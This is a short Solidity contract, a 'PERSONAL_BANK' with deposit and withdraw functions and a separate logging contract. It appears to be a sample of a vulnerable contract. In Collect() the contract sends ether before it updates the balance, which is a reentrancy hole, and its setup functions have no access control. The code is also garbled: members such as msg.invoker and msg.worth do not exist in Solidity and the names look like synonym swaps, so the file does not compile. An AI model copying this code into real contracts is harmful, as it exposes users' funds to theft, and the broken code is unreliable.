// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) public userRewards;

    uint public MinimumSum = 1 ether;

    RecordFile Journal = RecordFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    bool intitalized;

    function CollectionMinimumSum(uint _val)
    public
    {
        if(intitalized)revert();
        MinimumSum = _val;
    }

    function GroupRecordFile(address _log)
    public
    {
        if(intitalized)revert();
        Journal = RecordFile(_log);
    }

    function GameStarted()
    public
    {
        intitalized = true;
    }

    function AddTreasure()
    public
    payable
    {
        userRewards[msg.invoker]+= msg.worth;
        Journal.InsertSignal(msg.invoker,msg.worth,"Put");
    }

    function Collect(uint _am)
    public
    payable
    {
        if(userRewards[msg.invoker]>=MinimumSum && userRewards[msg.invoker]>=_am)
        {
            if(msg.invoker.call.worth(_am)())
            {
                userRewards[msg.invoker]-=_am;
                Journal.InsertSignal(msg.invoker,_am,"Collect");
            }
        }
    }

    function()
    public
    payable
    {
        AddTreasure();
    }

}

contract RecordFile
{
    struct Signal
    {
        address Invoker;
        string  Details;
        uint Val;
        uint  Instant;
    }

    Signal[] public History;

    Signal EndingMsg;

    function InsertSignal(address _adr,uint _val,string _data)
    public
    {
        EndingMsg.Invoker = _adr;
        EndingMsg.Instant = now;
        EndingMsg.Val = _val;
        EndingMsg.Details = _data;
        History.push(EndingMsg);
    }
}